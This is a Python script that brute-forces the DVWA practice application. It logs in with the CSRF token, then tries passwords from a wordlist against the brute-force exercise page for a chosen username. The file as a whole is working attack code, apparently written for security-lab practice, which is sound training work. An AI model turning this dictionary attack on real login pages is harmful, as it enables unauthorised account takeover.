import requests
import sys 
import argparse 
import time
import bs4 

def argparser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', help='Username for DVWA main authentication', required=True)
    parser.add_argument('-p', '--password', help='Password for DVWA main authentication', required=True)
    parser.add_argument('--target-username', '-tu', action='store', help='Username for DVWA brute force', required=True)
    parser.add_argument('-f', '--file', help='File containing passwords for DVWA brute force', required=True)
    parser.add_argument('-t', '--target', help='Base URL to DVWA ex. http://127.0.0.1', required=True)

    if len(sys.argv) < 2: 
        parser.print_help()
        exit(1)
    
    args = parser.parse_args()

    try: 
        print()
        print(f"[DEBUG] URL: {args.target}")
        print(f"[DEBUG] Username: {args.username}")
        print(f"[DEBUG] Password: {args.password}")
        print(f"[DEBUG] Target username: {args.target_username}\n")
    except Exception as e:
        print(f"[-] Error parsing arguments: {str(e)}")
        exit(1)

    return parser.parse_args()

# =========================
# === Start of __main__ ===
# ========================= 

args = argparser()

# Main auth into DVWA 
with requests.Session() as sess:
    main_auth_payload = { 
        'username': {args.username}, 
        'password': {args.password},
        'Login': 'Login'
    }

    res = sess.get(f'{args.target}' + '/login.php')

    try:
        user_token = bs4.BeautifulSoup(res.text, 'html.parser').select('input[name="user_token"]')[0]['value']
        main_auth_payload['user_token'] = user_token
        print(f"[+] CSRF user_token found: {user_token}")
    except:
        print("[-] CSRF user_token not found")
        exit(0)

    res = sess.post(f'{args.target}/login.php', data=main_auth_payload)

    if res.status_code == 200:
        print("[+] Main auth successful")
    else:
        print("[-] Main auth failed. Check your credentials!")
        exit(0)

print(f"\n[+] Bruteforcing against /vulnerabilities/brute in 3 seconds...\n")
time.sleep(3)

# Brute force attack to /vulnerabilities/brute using args.file dictionary 
with open(args.file, 'r') as f:
    for passwd in f:
        passwd = passwd.strip() 
        print(f"[*] Trying {passwd}...")
        payload = f'{args.target}/vulnerabilities/brute/?username={args.target_username}&password={passwd}&Login=Login'
        res = sess.get(payload)

        if res.status_code == 200 and 'Welcome to the password protected area' in res.text:
            print(f"\n[+] Bruteforce SUCCESS! Username: {args.target_username} Password: {passwd}\n")
            exit(0)
        else:
            continue 